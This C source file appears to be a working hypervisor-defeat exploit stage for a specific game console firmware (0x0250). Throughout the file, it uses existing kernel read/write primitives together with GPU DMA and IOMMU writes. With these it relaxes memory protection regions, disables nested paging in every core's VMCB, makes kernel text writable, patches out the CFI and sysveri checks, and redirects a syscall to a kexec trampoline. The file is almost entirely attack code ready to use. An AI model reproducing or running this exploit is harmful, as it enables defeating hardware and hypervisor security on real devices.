#include <errno.h>
#include <setjmp.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include "gpu_dma_0250.h"
#include "hv_0250.h"
#include "hv_defeat_0250.h"
#include "iommu_0250.h"
#include "prepare_resume.h"
#include "util_0250.h"

int cpuset(cpusetid_t *);

#define UART_ROUTE_CONTROL_PA 0xC0115110ULL
#define UART_TX_PA 0xC1010104ULL
#define UART_STATUS_PA 0xC101010CULL
#define UART_TX_FULL 0x800U
#define UART_TIMEOUT 0x1000000U

static int uart_puts_early(struct hv_defeat_ctx *ctx, const char *message) {
  if (!ctx->uart_route_changed) {
    uint64_t route = ctx->dmap_base + UART_ROUTE_CONTROL_PA;
    if (kernel_copyout(route, &ctx->uart_route_original,
                       sizeof(ctx->uart_route_original)))
      return -1;
    uint32_t enabled = ctx->uart_route_original & ~0x200U;
    if (kernel_copyin(&enabled, route, sizeof(enabled)))
      return -1;
    ctx->uart_route_changed = 1;
  }

  for (size_t i = 0; message[i] && i < 128; i++) {
    if (message[i] == '\n') {
      if (uart_puts_early(ctx, "\r"))
        return -1;
    }
    int ready = 0;
    for (uint32_t timeout = 0; timeout < UART_TIMEOUT; timeout++) {
      uint32_t status = 0;
      if (kernel_copyout(ctx->dmap_base + UART_STATUS_PA, &status,
                         sizeof(status)))
        return -1;
      if ((status & UART_TX_FULL) == 0) {
        ready = 1;
        break;
      }
      __asm__ volatile("pause");
    }
    if (!ready)
      return -1;
    uint32_t value = (uint8_t)message[i];
    if (kernel_copyin(&value, ctx->dmap_base + UART_TX_PA, sizeof(value)))
      return -1;
  }
  return 0;
}

static int uart_restore_route(struct hv_defeat_ctx *ctx) {
  if (!ctx->uart_route_changed)
    return 0;
  usleep(10000);
  if (kernel_copyin(&ctx->uart_route_original,
                    ctx->dmap_base + UART_ROUTE_CONTROL_PA,
                    sizeof(ctx->uart_route_original)))
    return -1;
  ctx->uart_route_changed = 0;
  return 0;
}

static int stage0_discover(struct hv_defeat_ctx *ctx) {
  ctx->fw = kernel_get_fw_version() >> 16;
  if (ctx->fw != 0x0250) {
    printf("  expected fw 0x0250, found 0x%04x\n", ctx->fw);
    return -1;
  }

  ctx->kbase = (uint64_t)KERNEL_ADDRESS_DATA_BASE - FW_0250_KDATA_OFFSET;
  if (ctx->kbase != ktext || !INKERNEL(ctx->kbase)) {
    printf("  inconsistent kernel base 0x%lx\n", ctx->kbase);
    return -1;
  }

  int32_t ml4i = (int32_t)kr4_0250(ctx->kbase + FW_0250_DMPML4I);
  int32_t dpi = (int32_t)kr4_0250(ctx->kbase + FW_0250_DMPDPI);
  if (ml4i < 0x100 || ml4i > 0x1FF || dpi < 0 || dpi > 0x1FF) {
    printf("  invalid DMAP indices ml4i=%d dpi=%d\n", ml4i, dpi);
    return -1;
  }
  ctx->dmap_base =
      ((uint64_t)dpi << 30) | ((uint64_t)ml4i << 39) | 0xFFFF800000000000ULL;

  uint64_t kernel_pmap = ctx->kbase + FW_0250_PMAP_STORE;
  uint64_t kernel_pml4 = kr8_0250(kernel_pmap + FW_0250_PMAP_PM_PML4);
  uint64_t kernel_cr3 = kr8_0250(kernel_pmap + FW_0250_PMAP_PM_CR3);
  if (!INKERNEL(ctx->dmap_base) || !INKERNEL(kernel_pml4) || !kernel_cr3 ||
      (kernel_cr3 & 0xFFF) || kernel_cr3 >= 0x1000000000ULL ||
      kernel_pml4 != ctx->dmap_base + kernel_cr3 || ctx->dmap_base != dmap ||
      kernel_cr3 != cr3) {
    printf("  invalid DMAP relation pml4=0x%lx cr3=0x%lx\n", kernel_pml4,
           kernel_cr3);
    return -1;
  }

  if (uart_puts_early(ctx, "[P25:UART]\n")) {
    printf("  UART transmit probe timed out\n");
    return -1;
  }

  return 0;
}

static int tmr_relax_for_pa(uint64_t dmap, uint64_t pa, uint32_t *saved,
                            int *count) {
  uint32_t pa16 = (uint32_t)(pa >> 16);
  for (int i = MAX_TMR - 1; i >= 0; i--) {
    if (i == 19 || i == 20)
      continue;
    uint32_t b = tmr_read_0250(dmap, TMR_BASE(i));
    uint32_t l = tmr_read_0250(dmap, TMR_LIMIT(i));
    uint32_t c = tmr_read_0250(dmap, TMR_CONFIG(i));
    if ((c & 1) == 0 || pa16 < b || pa16 > l)
      continue;

    if (*count >= MAX_SAVED_TMRS) {
      printf("  refusing to modify unsaved tmr[%d]\n", i);
      return -1;
    }
    saved[*count * 2] = (uint32_t)i;
    saved[*count * 2 + 1] = c;
    (*count)++;
    tmr_write_0250(dmap, TMR_CONFIG(i), TMR_CFG_PERMISSIVE);
    uint32_t v = tmr_read_0250(dmap, TMR_CONFIG(i));
    if (v != TMR_CFG_PERMISSIVE) {
      printf("  tmr[%d] relax failed: 0x%08x\n", i, v);
      return -1;
    }
  }
  return 0;
}

static int stage1_tmr_relax(struct hv_defeat_ctx *ctx) {
  if (dr4_0250(ctx->dmap_base, ECAM_B0D18F2) == 0xFFFFFFFF)
    return -1;

  ctx->saved_tmr_count = 0;
  ctx->tmr_disabled = 1;
  uint64_t kpa = (uint64_t)tmr_read_0250(ctx->dmap_base, TMR_BASE(16)) << 16;
  if (!kpa || kpa >= 0x1000000000ULL) {
    printf("  invalid tmr16 base 0x%lx\n", kpa);
    return -1;
  }

  int ret = tmr_relax_for_pa(ctx->dmap_base, kpa, ctx->saved_tmrs,
                             &ctx->saved_tmr_count);
  if (ret)
    return ret;

  return ctx->saved_tmr_count ? 0 : -1;
}

static int stage1_tmr_restore(struct hv_defeat_ctx *ctx) {
  if (!ctx->saved_tmr_count) {
    ctx->tmr_disabled = 0;
    return 0;
  }

  int failed = 0;
  for (int i = ctx->saved_tmr_count - 1; i >= 0; i--) {
    uint32_t index = ctx->saved_tmrs[i * 2];
    uint32_t original = ctx->saved_tmrs[i * 2 + 1];
    tmr_write_0250(ctx->dmap_base, TMR_CONFIG(index), original);
    uint32_t readback = tmr_read_0250(ctx->dmap_base, TMR_CONFIG(index));
    if (readback != original) {
      printf("  tmr[%u] restore failed: 0x%08x\n", index, readback);
      failed = 1;
    }
  }
  if (!failed)
    ctx->tmr_disabled = 0;
  return failed ? -1 : 0;
}

static int stage2_find_vmcbs(struct hv_defeat_ctx *ctx) {
  uint64_t ktext_pa = (uint64_t)tmr_read_0250(ctx->dmap_base, TMR_BASE(16))
                      << 16;
  ctx->hv_data_pa = ktext_pa + FW_0250_KERNEL_TEXT_SIZE;

  ctx->vmcb_count = 0;
  for (int c = 0; c < 16; c++) {
    uint64_t ptr_pa = ctx->hv_data_pa + FW_0250_HV_VCPU +
                      (uint64_t)c * FW_0250_HV_VCPU_STRIDE;
    uint64_t vmcb_va = 0;
    uint64_t vmcb_va_check = 0;
    if (gpu_0250_read_phys(ptr_pa, &vmcb_va, sizeof(vmcb_va)) ||
        gpu_0250_read_phys(ptr_pa, &vmcb_va_check, sizeof(vmcb_va_check)) ||
        vmcb_va_check != vmcb_va) {
      printf("  core %2d: unstable VMCB pointer at 0x%lx\n", c, ptr_pa);
      return -2;
    }
    if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF)) {
      printf("  core %2d: invalid VMCB address 0x%lx\n", c, vmcb_va);
      return -2;
    }
    uint64_t vmcb_pa = pmap_kextract_0250(vmcb_va);

    if (!vmcb_pa || vmcb_pa >= 0x100000000ULL || (vmcb_pa & 0xFFF)) {
      printf("  core %2d: bad vmcb_pa 0x%lx\n", c, vmcb_pa);
      return -2;
    }
    for (int i = 0; i < ctx->vmcb_count; i++) {
      if (ctx->vmcb_pas[i] == vmcb_pa) {
        printf("  core %2d: duplicate vmcb_pa 0x%lx\n", c, vmcb_pa);
        return -2;
      }
    }

    uint64_t np = 0, np_check = 0, n_cr3 = 0, n_cr3_check = 0;
    if (gpu_0250_read_phys(vmcb_pa + VMCB_NP_ENABLE, &np, sizeof(np)) ||
        gpu_0250_read_phys(vmcb_pa + VMCB_NP_ENABLE, &np_check,
                           sizeof(np_check)) ||
        gpu_0250_read_phys(vmcb_pa + VMCB_N_CR3, &n_cr3, sizeof(n_cr3)) ||
        gpu_0250_read_phys(vmcb_pa + VMCB_N_CR3, &n_cr3_check,
                           sizeof(n_cr3_check))) {
      printf("  core %2d: VMCB content read failed\n", c);
      return -2;
    }
    if (np != np_check || n_cr3 != n_cr3_check) {
      printf("  core %2d: unstable VMCB content\n", c);
      return -2;
    }
    if ((np & 0x9) != 0x9 || !n_cr3 || (n_cr3 & 0xFFF) ||
        n_cr3 >= 0x1000000000ULL) {
      printf("  core %2d: invalid np=0x%lx n_cr3=0x%lx\n", c, np, n_cr3);
      return -2;
    }
    if (ctx->vmcb_count && n_cr3 != ctx->vmcb_n_cr3) {
      printf("  core %2d: NPT root differs (0x%lx != 0x%lx)\n", c, n_cr3,
             ctx->vmcb_n_cr3);
      return -2;
    }

    if (ctx->vmcb_count < MAX_VMCBS) {
      ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
      ctx->vmcb_np_original[ctx->vmcb_count] = np;
      ctx->vmcb_n_cr3 = n_cr3;
      ctx->vmcb_count++;
    }
  }

  return ctx->vmcb_count == MAX_VMCBS ? 0 : -2;
}

static int iommu_selftest(struct iommu_ctx *iommu, uint64_t dmap,
                          uint64_t scratch_pa) {
  if (!scratch_pa || scratch_pa >= IOMMU_PHYS_ADDR_LIMIT || (scratch_pa & 7)) {
    printf("  bad scratch PA 0x%lx\n", scratch_pa);
    return -1;
  }

  uint64_t original = 0;
  if (kernel_copyout(dmap + scratch_pa, &original, sizeof(original)))
    return -1;
  uint64_t pattern = original ^ 0xDEADCAFE12345678ULL;

  if (iommu_0250_write8_pa(iommu, scratch_pa, pattern))
    return -1;
  uint64_t readback = 0;
  if (kernel_copyout(dmap + scratch_pa, &readback, sizeof(readback)))
    return -1;

  if (readback != pattern) {
    iommu_0250_write8_pa(iommu, scratch_pa, original);
    return -1;
  }
  if (iommu_0250_write8_pa(iommu, scratch_pa, original) ||
      kernel_copyout(dmap + scratch_pa, &readback, sizeof(readback)) ||
      readback != original) {
    printf("  scratch restore failed\n");
    return -1;
  }
  return 0;
}

static int stage3_patch_vmcbs(struct hv_defeat_ctx *ctx,
                              struct iommu_ctx *iommu) {
  if (ctx->vmcb_count == 0)
    return -1;

  int cur = sceKernelGetCurrentCpu();
  if (pin_to_core_0250(cur)) {
    printf("  failed to pin to current core %d\n", cur);
    return -1;
  }

  int written = 0;
  int failed = 0;
  for (int i = 0; i < ctx->vmcb_count; i++) {
    uint64_t pa = ctx->vmcb_pas[i];

    written = i + 1;
    if (iommu_0250_write8_pa(iommu, pa + VMCB_NP_ENABLE, 0)) {
      printf("  vmcb[%2d] write failed\n", i);
      failed = 1;
      break;
    }

    uint64_t readback = ~0ULL;
    if (gpu_0250_read_phys(pa + VMCB_NP_ENABLE, &readback, sizeof(readback)) ||
        readback != 0) {
      printf("  vmcb[%2d] write verification failed: 0x%lx\n", i, readback);
      failed = 1;
      break;
    }
  }

  if (failed || written != ctx->vmcb_count) {
    printf("  rolling back %d VMCB writes\n", written);
    int rollback_failed = 0;
    for (int i = written - 1; i >= 0; i--) {
      uint64_t pa = ctx->vmcb_pas[i] + VMCB_NP_ENABLE;
      uint64_t readback = 0;
      if (iommu_0250_write8_pa(iommu, pa, ctx->vmcb_np_original[i]) ||
          gpu_0250_read_phys(pa, &readback, sizeof(readback)) ||
          readback != ctx->vmcb_np_original[i]) {
        printf("  vmcb[%2d] rollback failed\n", i);
        rollback_failed = 1;
      }
    }
    unpin_0250();
    if (rollback_failed)
      ctx->vmcbs_patched = 1;
    return rollback_failed ? -2 : -1;
  }

  ctx->vmcbs_patched = 1;
  if (unpin_0250()) {
    printf("  failed to restore broad core affinity\n");
    return -1;
  }

  return 0;
}

static int make_entry_rwx(uint64_t entry_va, uint64_t entry, uint64_t target,
                          const char *level) {
  if (entry_va == ~0ULL || !PDE_FIELD(entry, PRESENT)) {
    printf("  missing %s for 0x%lx\n", level, target);
    return -1;
  }

  CLEAR_PDE_BIT(entry, XOTEXT);
  SET_PDE_BIT(entry, RW);
  kernel_copyin(&entry, entry_va, sizeof(entry));

  uint64_t readback = 0;
  kernel_copyout(entry_va, &readback, sizeof(readback));
  if (PDE_FIELD(readback, XOTEXT) || !PDE_FIELD(readback, RW)) {
    printf("  %s verification failed for 0x%lx\n", level, target);
    return -1;
  }
  return 0;
}

static int make_page_rwx(uint64_t pmap, uint64_t target) {
  uint64_t entry = 0;
  uint64_t entry_va = find_pml4e_0250(pmap, target, &entry);
  if (make_entry_rwx(entry_va, entry, target, "PML4E"))
    return -1;

  entry_va = find_pdpe_0250(pmap, target, &entry);
  if (make_entry_rwx(entry_va, entry, target, "PDPE"))
    return -1;
  if (PDE_FIELD(entry, PS))
    return 0;

  entry_va = find_pde_0250(pmap, target, &entry);
  if (make_entry_rwx(entry_va, entry, target, "PDE"))
    return -1;
  if (PDE_FIELD(entry, PS))
    return 0;

  entry_va = find_pte_0250(pmap, target, &entry);
  return make_entry_rwx(entry_va, entry, target, "PTE");
}

static int stage3b_remove_xotext(struct hv_defeat_ctx *ctx) {
  uint64_t pmap = ctx->kbase + FW_0250_PMAP_STORE;
  const uint64_t targets[] = {
      ktext + 0x041FCA0,
      ktext + FW_0250_JMP_PTR_RSI,
      ktext + FW_0250_KERNEL_CODE_CAVE,
      ktext + FW_0250_PPR_SYSENT + 0x11 * sizeof(sysent),
      ktext + 0x411CD70,
      ktext + 0x245BEE0 + 0x70,
  };

  for (size_t i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
    if (make_page_rwx(pmap, targets[i]))
      return -1;
  }
  return 0;
}

static int read_kernel_phys_0250(uint64_t va, void *output, uint32_t size) {
  uint64_t pa = pmap_kextract_0250(va);
  if (!pa || ((pa & 0xFFF) + size) > 0x1000)
    return -1;
  return gpu_0250_read_phys(pa, output, size);
}

static int stage_prevalidate_targets(void) {

  const uint8_t cfi_expected[] = {0x55, 0x48, 0x89, 0xE5};
  uint8_t cfi[sizeof(cfi_expected)] = {0};
  if (read_kernel_phys_0250(ktext + 0x041FCA0, cfi, sizeof(cfi)) ||
      memcmp(cfi, cfi_expected, sizeof(cfi))) {
    printf("  CFI site is not pristine\n");
    return -1;
  }

  uint8_t trampoline[2] = {0};
  if (read_kernel_phys_0250(ktext + FW_0250_JMP_PTR_RSI, trampoline,
                            sizeof(trampoline)) ||
      trampoline[0] != 0xCC || trampoline[1] != 0xCC) {
    printf("  trampoline cave is not pristine\n");
    return -1;
  }

  uint8_t final_cave[0x200] = {0};
  if (read_kernel_phys_0250(ktext + FW_0250_KERNEL_CODE_CAVE, final_cave,
                            sizeof(final_cave))) {
    printf("  final entry cave read failed\n");
    return -1;
  }
  for (size_t i = 0; i < sizeof(final_cave); i++) {
    if (final_cave[i] != 0xCC) {
      printf("  final entry cave is not pristine\n");
      return -1;
    }
  }

  uint32_t jump_entry = 0;
  if (read_kernel_phys_0250(ktext + 0x245BEE0 + 0x70, &jump_entry,
                            sizeof(jump_entry)) ||
      jump_entry != 0xFE684824U) {
    printf("  hypercall-4 entry is not pristine: 0x%08x\n", jump_entry);
    return -1;
  }

  uint8_t sysveri = 0;
  if (read_kernel_phys_0250(ktext + 0x411CD70, &sysveri, sizeof(sysveri)) ||
      sysveri != 1) {
    printf("  sysveri flag is not pristine: 0x%02x\n", sysveri);
    return -1;
  }

  uint64_t sysent_va = ktext + FW_0250_PPR_SYSENT + 0x11 * sizeof(sysent);
  sysent entry = {0};
  if (read_kernel_phys_0250(sysent_va, &entry, sizeof(entry)) ||
      entry.n_arg != 0 || entry.sy_call != ktext + 0x026E0D0 ||
      entry.sy_flags != 0 || entry.sy_thrcnt != 4) {
    printf("  syscall gateway is not pristine\n");
    return -1;
  }

  return 0;
}

static int stage4_verify(struct hv_defeat_ctx *ctx) {
  int failed = 0;
  if (ctx->vmcb_count != MAX_VMCBS)
    failed = 1;

  for (int i = 0; i < ctx->vmcb_count; i++) {
    uint64_t np = ~0ULL;
    int ok = !kernel_copyout(ctx->dmap_base + ctx->vmcb_pas[i] + VMCB_NP_ENABLE,
                             &np, sizeof(np)) &&
             (np & 0x9) == 0;
    if (!ok) {
      printf("  vmcb[%2d] verification failed: 0x%lx\n", i, np);
      failed = 1;
    }
  }
  return failed ? -1 : 0;
}

static int widen_cpuset_syscall() {
  cpusetid_t new_id;
  int ret = cpuset(&new_id);
  if (ret) {
    printf("  cpuset() failed: ret=%d errno=%d\n", ret, errno);
    return -1;
  }
  cpuset_t mask;
  CPU_ZERO(&mask);
  mask.__bits[0] = 0xFFFF;

  ret =
      cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_CPUSET, new_id, 0x8, &mask);
  if (ret) {
    printf("  cpuset_setaffinity() failed: ret=%d errno=%d\n", ret, errno);
    return -1;
  }
  return 0;
}

static int stage5_patch_kernel(struct hv_defeat_ctx *ctx) {
  if (ctx->fw != 0x0250)
    return -1;

  struct required_patch {
    const char *name;
    uint64_t offset;
    uint8_t original[2];
    uint8_t desired[2];
    uint32_t length;
  } patches[] = {
      {"cfi_check_fail", 0x041FCA0, {0x55, 0x00}, {0xC3, 0x00}, 1},
      {"kexec_trampoline", 0x0042000, {0xCC, 0xCC}, {0xFF, 0x26}, 2},
      {"sysveri_flag", 0x411CD70, {0x01, 0x00}, {0x00, 0x00}, 1},
  };

  for (size_t i = 0; i < sizeof(patches) / sizeof(patches[0]); i++) {
    const struct required_patch *patch = &patches[i];
    uint8_t current[2] = {0};
    uint64_t va = ktext + patch->offset;
    uint64_t pa = pmap_kextract_0250(va);
    if (!pa || pa >= 0x100000000ULL) {
      printf("  %s bad PA 0x%lx\n", patch->name, pa);
      return -1;
    }
    kernel_copyout(va, current, patch->length);
    if (memcmp(current, patch->original, patch->length) != 0 &&
        memcmp(current, patch->desired, patch->length) != 0) {
      printf("  %s unexpected bytes %02x %02x\n", patch->name, current[0],
             current[1]);
      return -1;
    }
    if (memcmp(current, patch->desired, patch->length) != 0)
      kernel_copyin(patch->desired, va, patch->length);
    kernel_copyout(va, current, patch->length);
    if (memcmp(current, patch->desired, patch->length) != 0) {
      printf("  %s verification failed\n", patch->name);
      return -1;
    }
  }
  return 0;
}

static int stage6_install_kexec(void) {
  uint64_t entry_va = ktext + FW_0250_PPR_SYSENT + 0x11 * sizeof(sysent);
  uint64_t entry_pa = pmap_kextract_0250(entry_va);
  uint64_t jmp = ktext + FW_0250_JMP_PTR_RSI;

  if (!entry_pa || entry_pa >= 0x100000000ULL) {
    printf("  bad sysent PA\n");
    return -1;
  }

  sysent before = {0};
  kernel_copyout(entry_va, &before, sizeof(before));
  uint64_t original_call = ktext + 0x026E0D0;
  if (before.sy_call != original_call && before.sy_call != jmp) {
    printf("  unexpected original syscall target\n");
    return -1;
  }

  kw4_0250(entry_va + offsetof(sysent, n_arg), 2);
  kw8_0250(entry_va + offsetof(sysent, sy_call), jmp);
  kw4_0250(entry_va + offsetof(sysent, sy_flags), 0);
  kw4_0250(entry_va + offsetof(sysent, sy_thrcnt), 1);

  sysent after = {0};
  kernel_copyout(entry_va, &after, sizeof(after));
  int ok = after.n_arg == 2 && after.sy_call == jmp && after.sy_flags == 0 &&
           after.sy_thrcnt == 1;
  if (!ok)
    printf("  syscall gateway verification failed\n");
  return ok ? 0 : -1;
}

static jmp_buf vmmcall_jmp_env;

static void handle_vmmcall_sigill(int signal_number) {
  (void)signal_number;
  longjmp(vmmcall_jmp_env, 1);
}

static int reload_vmcbs(void) {
  void (*old_handler)(int) = signal(SIGILL, handle_vmmcall_sigill);
  if (old_handler == SIG_ERR)
    return -1;

  int completed = 0;
  int failed = 0;
  for (int i = 0; i < 16; i++) {
    if (pin_to_core_0250(i)) {
      printf("[vmcb-reload] core: %2d affinity failed\n", i);
      failed = 1;
      break;
    }
    int actual_core = sceKernelGetCurrentCpu();
    if (actual_core != i) {
      printf("[vmcb-reload] requested core %2d, running on %2d\n", i,
             actual_core);
      failed = 1;
      break;
    }
    if (setjmp(vmmcall_jmp_env) == 0) {
      __asm__ volatile("xor %%eax, %%eax; vmmcall" : : : "rax", "memory");
    }

    completed++;
  }

  signal(SIGILL, old_handler);
  if (unpin_0250())
    failed = 1;
  if (completed != 16)
    failed = 1;
  return failed ? -1 : 0;
}

__attribute__((noreturn)) static void
stop_after_committed_failure(struct hv_defeat_ctx *ctx, int error) {
  printf("HV25 FATAL: failure %d after VMCB commit; cold reboot required\n",
         error);
  uart_puts_early(ctx, "[P25:FATAL]\n");
  for (;;)
    __asm__ volatile("pause");
}

static void configure_gpu_offsets(void) {
  struct gpu_0250_offsets offsets = {0};
  offsets.proc_vmspace = KERNEL_OFFSET_PROC_P_VMSPACE;
  offsets.vmspace_vm_vmid = env_offset.VMSPACE_VM_VMID;
  offsets.sizeof_gvmspace = 0x100;
  offsets.gvmspace_page_dir_va = 0x38;
  offsets.gvmspace_size = 0x10;
  offsets.gvmspace_start_va = 0x08;
  offsets.data_base_gvmspace = env_offset.DATA_BASE_GVMSPACE;
  gpu_0250_set_offsets(&offsets);
}

static int run_hv_flow(void) {
  struct hv_defeat_ctx ctx;
  struct iommu_ctx iommu;
  memset(&ctx, 0, sizeof(ctx));
  memset(&iommu, 0, sizeof(iommu));

  int r = 0;
  int gpu_started = 0;
  int loader_ready = 0;
  int committed = 0;

  if ((r = stage0_discover(&ctx)))
    goto out;

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  if (widen_cpuset_syscall() != 0) {
    r = -10;
    goto out;
  }

  configure_gpu_offsets();
  gpu_started = 1;
  if ((r = gpu_0250_init()))
    goto out;

  if ((r = stage1_tmr_relax(&ctx)))
    goto out;

  if ((r = iommu_0250_init(&iommu, ctx.kbase)))
    goto out;

  if ((r = iommu_selftest(&iommu, ctx.dmap_base,
                          gpu_0250_get_ctx()->transfer_real_pa + 0x100000)))
    goto out;

  if ((r = stage2_find_vmcbs(&ctx)))
    goto out;

  if ((r = stage_prevalidate_targets()))
    goto out;

  if ((r = uart_puts_early(&ctx, "[P25:COMMIT]\n")))
    goto out;

  if ((r = stage3_patch_vmcbs(&ctx, &iommu))) {
    if (ctx.vmcbs_patched)
      committed = 1;
    goto out;
  }
  committed = 1;

  if ((r = reload_vmcbs()))
    goto out;

  if ((r = stage3b_remove_xotext(&ctx)))
    goto out;

  if ((r = kernel_pmap_invalidate_all()))
    goto out;

  if ((r = stage4_verify(&ctx)))
    goto out;

  if ((r = stage5_patch_kernel(&ctx)))
    goto out;

  if ((r = stage6_install_kexec()))
    goto out;

  if ((r = stage1_tmr_restore(&ctx)))
    goto out;

  loader_ready = 1;

out:
  if (committed && r)
    stop_after_committed_failure(&ctx, r);
  if (ctx.tmr_disabled) {
    int restore_result = stage1_tmr_restore(&ctx);
    if (!r && restore_result)
      r = restore_result;
  }
  if (gpu_started) {
    int cleanup_result = gpu_0250_cleanup();
    if (!r && cleanup_result)
      r = cleanup_result;
  }
  if (unpin_0250() && !r)
    r = -30;
  if (committed && r)
    stop_after_committed_failure(&ctx, r);
  if (r && uart_restore_route(&ctx))
    printf("  UART route restore failed\n");
  if (!r && loader_ready)
    uart_puts_early(&ctx, "[P25:READY]\n");
  return r;
}

int hv_defeat_0250(void) { return run_hv_flow(); }
